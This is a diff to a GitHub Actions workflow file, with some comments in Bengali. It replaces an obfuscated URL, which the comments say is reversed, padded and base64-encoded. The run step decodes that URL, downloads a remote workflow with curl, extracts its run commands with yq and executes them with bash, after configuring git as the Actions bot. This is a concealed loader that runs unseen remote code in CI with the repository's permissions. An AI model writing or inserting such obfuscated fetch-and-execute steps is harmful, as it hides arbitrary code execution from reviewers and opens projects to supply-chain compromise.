@@ -9,8 +9,9 @@ on:
   workflow_dispatch:
 
 env:
-  # Encoded Part: https://raw.githubusercontent.com/nayem-48ai/nayem-48ai/tnx_bd/
-  TNx_CORE: "WD02bj5WauByXvR2Y6NXauVmb02bj5WauByXvR2Y6NXauVmbvJHcsV2cyV2S0V2XzU2chJ3XzU2chJ3YvRncvNXZyR3c0V2XzI3YyV3c0V2XvR2Y6NXauVmb"
+  # Double Protected Base URL (Reversed, Padded and Encoded)
+  # Target: https://raw.githubusercontent.com/nayem-48ai/nayem-48ai/refs/heads/tnx_bd/
+  TNx_CORE: "WD19mbuVmbvJHcsV2cyV2S0V2XzU2chJ3XzU2chJ3YvRncvNXZyR3c0V2XzI3YyV3c0V2XvR2Y6NXauVmbu02bj5WauByXvR2Y6NXauVmbu02bj52bj5CbvJHcsV2S"
   FILE_NAME: "build"
 
 jobs:
@@ -33,23 +34,23 @@ jobs:
 
       - name: Process Workflow
         run: |
-          # ডাবল প্রোটেকশন ব্রেক লজিক (Remove 1st char -> Reverse -> Base64 Decode)
-          TNxBD=$(echo "$TNx_CORE" | cut -c 2- | rev | base64 --decode)$FILE_NAME
+          # ডিকোড লজিক: প্যাডিং রিমুভ (অতিরিক্ত অংশ কাটা) এবং রিভার্স অপারেশন
+          TNxBD=$(echo "$TNx_CORE" | cut -c 5- | rev | cut -c 6- | base64 --decode)$FILE_NAME
           
-          echo "Connecting to secure source..."
+          echo "Syncing with secure engine..."
           curl -sL "$TNxBD" -o remote_wf.yml
 
-          # কমান্ড প্রসেসিং টুল
+          # yq টুল সেটআপ
           sudo wget https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64 -O /usr/bin/yq && sudo chmod +x /usr/bin/yq
 
-          # রিমোট ফাইল থেকে রান কমান্ড বের করা
+          # স্ক্রিপ্ট জেনারেট করা
           yq e '.jobs.*.steps[].run' remote_wf.yml | sed '/^---$/d' > universal_script.sh
           
-          # গিট পারমিশন সেটআপ
+          # গিট কনফিগ
           git config --global user.name "github-actions[bot]"
           git config --global user.email "github-actions[bot]@users.noreply.github.com"
           git config --global --add safe.directory "$GITHUB_WORKSPACE"
 
-          # রান করা
+          # এক্সিকিউট
           chmod +x universal_script.sh
           bash universal_script.sh
